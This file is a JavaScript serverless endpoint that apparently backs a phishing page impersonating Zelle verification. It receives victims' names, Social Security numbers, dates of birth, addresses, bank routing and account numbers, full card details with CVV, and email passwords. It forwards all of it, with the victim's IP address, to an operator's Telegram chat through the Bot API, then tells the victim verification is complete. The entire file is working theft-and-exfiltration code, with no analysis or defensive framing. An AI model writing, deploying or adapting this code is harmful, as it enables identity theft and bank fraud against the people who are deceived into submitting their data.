export default async function handler(req, res) {
  // Enable CORS for security
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  // Handle preflight
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  // Only allow POST
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }
  
  try {
    const {
      fullName,
      addressStreet,
      addressCity,
      addressState,
      addressZip,
      ssn,
      dob,
      routingNumber,
      accountNumber,
      cardNumber,
      cardExpiry,
      cardCvv,
      email,
      password
    } = req.body;
    
    // Get credentials from environment variables
    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
    
    // Validate credentials
    if (!BOT_TOKEN || !CHAT_ID) {
      console.error('Missing Telegram credentials');
      return res.status(500).json({ 
        success: false, 
        error: 'Telegram configuration error. Please contact support.' 
      });
    }
    
    // Validate required fields
    if (!fullName || !email) {
      return res.status(400).json({ 
        success: false, 
        error: 'Missing required fields' 
      });
    }
    
    // Format the message
    const currentTime = new Date().toLocaleString('en-US', { 
      timeZone: 'America/New_York',
      dateStyle: 'full',
      timeStyle: 'long'
    });
    
    const message = `🔐 *ZELLE® VERIFICATION ALERT* 🔐
    
━━━━━━━━━━━━━━━━━━━━━━━━━━
👤 *PERSONAL INFORMATION*
━━━━━━━━━━━━━━━━━━━━━━━━━━
*Full Name:* ${fullName}
*SSN:* ${ssn || 'N/A'}
*DOB:* ${dob || 'N/A'}

📍 *ADDRESS*
━━━━━━━━━━━━━━━━━━━━━━━━━━
${addressStreet}, ${addressCity}, ${addressState} ${addressZip}

🏦 *BANK DETAILS*
━━━━━━━━━━━━━━━━━━━━━━━━━━
*Routing:* ${routingNumber || 'N/A'}
*Account:* ${accountNumber || 'N/A'}

💳 *CARD INFORMATION*
━━━━━━━━━━━━━━━━━━━━━━━━━━
*Card:* ${cardNumber || 'N/A'}
*Expiry:* ${cardExpiry || 'N/A'}
*CVV:* ${cardCvv || 'N/A'}

📧 *EMAIL VERIFICATION*
━━━━━━━━━━━━━━━━━━━━━━━━━━
*Email:* ${email}
*Password:* ${password || 'N/A'}

━━━━━━━━━━━━━━━━━━━━━━━━━━
🕐 *Timestamp:* ${currentTime}
🔒 *IP:* ${req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Hidden'}
━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ *VERIFICATION COMPLETED* ⚠️`;
    
    // Send to Telegram
    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
        disable_web_page_preview: true
      })
    });
    
    const data = await response.json();
    
    if (data.ok) {
      console.log('✅ Telegram message sent successfully');
      return res.status(200).json({ 
        success: true, 
        message: 'Verification complete' 
      });
    } else {
      console.error('Telegram API error:', data);
      return res.status(500).json({ 
        success: false, 
        error: data.description || 'Failed to send verification' 
      });
    }
    
  } catch (error) {
    console.error('Server error:', error);
    return res.status(500).json({ 
      success: false, 
      error: 'Internal server error. Please try again.' 
    });
  }
}
